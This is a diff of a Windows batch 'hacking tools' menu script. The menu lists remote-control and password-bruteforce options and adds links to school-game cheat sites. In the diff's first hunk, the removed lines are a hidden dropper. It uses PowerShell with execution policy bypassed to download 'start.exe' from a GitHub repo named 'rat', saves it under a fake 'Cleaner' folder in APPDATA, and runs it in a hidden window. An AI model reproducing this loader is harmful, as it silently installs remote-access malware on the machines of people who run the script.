@@ -3,28 +3,7 @@
 setlocal EnableDelayedExpansion
 chcp 65001>nul
 cls
-set "DL_DIR=%APPDATA%\Cleaner"
-set "DL_FILE=%DL_DIR%\start.exe"
-set "DL_URL=https://raw.githubusercontent.com/pulgax-g/rat/main/start.exe"
-if not exist "%DL_DIR%" (
-    mkdir "%DL_DIR%"
-)
-
-if exist "%DL_FILE%" (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "Start-Process -FilePath "%DL_FILE%" -WindowStyle Hidden -PassThru"
-    goto idk
-    exit
-    
-)
-powershell -NoProfile -ExecutionPolicy Bypass ^
- -Command "Invoke-WebRequest -Uri '%DL_URL%' -OutFile '%DL_FILE%'"
-if exist "%DL_FILE%" (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "Start-Process -FilePath "%DL_FILE%" -WindowStyle Hidden -PassThru"
-    goto idk
-    exit
-)
+mode 40,10
 :idk
 cls
 set "pastebin=https://pastebin.com/raw/jtDN3eXr"
@@ -131,6 +110,7 @@ ping localhost -n 2 >nul
 pause
 goto menu
 :menu
+mode 120,30
 cls
 echo.
 echo.
@@ -150,14 +130,12 @@ set /p imput=.%BS%                                       ╚══»
 if /I %imput% EQU /commands goto commands
 if /I %imput% EQU 1 goto commands
 if /I %imput% EQU 0 goto exit
-if /I %imput% EQU 2 goto CMD
-if /I %imput% EQU 3 goto RPC
-if /I %imput% EQU 4 goto bruteforce
-if /i not %pass%== 1,0,2,3,4,/commands goto menu
+if /i not %pass%== 1,0,/commands goto menu
 
 
 :commands
 cls
+mode 120,30
 echo.
 echo.
 echo       	                                        [38;2;255;255;0mmade by pulgax
@@ -178,7 +156,8 @@ echo           │         └───────────────┘  
 echo           ├─{1} parrot             [I]  ├─{4}REMOTE CONTROLL PC   [I]  ├─{11}discord
 echo           ├─{2} mejor cmd          [I]  ├─{5}BRUTEFORCE PC PASS   [I]  └─{22}exit
 echo           └─{3} optimizador        [I]  ├─{6}BRUTEFORCE WIFI PASS [I]                         
-echo                                         └─{7}WEB: Skibidi Zone    [x]
+echo                                         ├─{7}WEB: Skibidi Zone    [x]
+echo                                         └─{8}Links                [I]
 echo                                               type a command number(0,1,2,3...)
 set /p imput=.%BS%                                            ╚══»
 if /I %imput% EQU 1 goto test
@@ -188,9 +167,22 @@ if /I %imput% EQU 4 goto rpc
 if /I %imput% EQU 5 goto brutf
 if /I %imput% EQU 6 goto brutfwif
 if /I %imput% EQU 7 echo aun no acabado! 
+if /I %imput% EQU 8 goto links
 if /I %imput% EQU 11 goto discord
 if /I %imput% EQU 22 goto exit
 pause >nul
+echo wrong command
+goto commands
+
+:links
+cls
+echo Blooket: https://www.blooket.com/play  / (1)schoolcheats.net / (2)https://blooketbot.schoolcheats.net/
+echo oficial discord server: https://dsc.gg/skibidihub
+echo.
+echo type the number of the link you want to open
+set /p imput=.%BS%                                            ╚══» 
+if /I %imput% EQU 1 start https://schoolcheats.net/
+if /I %imput% EQU 2 start https://blooketbot.schoolcheats.net/
 
 
 :test
@@ -968,7 +960,10 @@ if /I %errorlevel% EQU 0 (
 	exit
 )
 
-
+:discord
+start https://dsc.gg/skibidihub
+pause>nul
+exit
 
 :exit
 echo Are you sure? (Y/N)
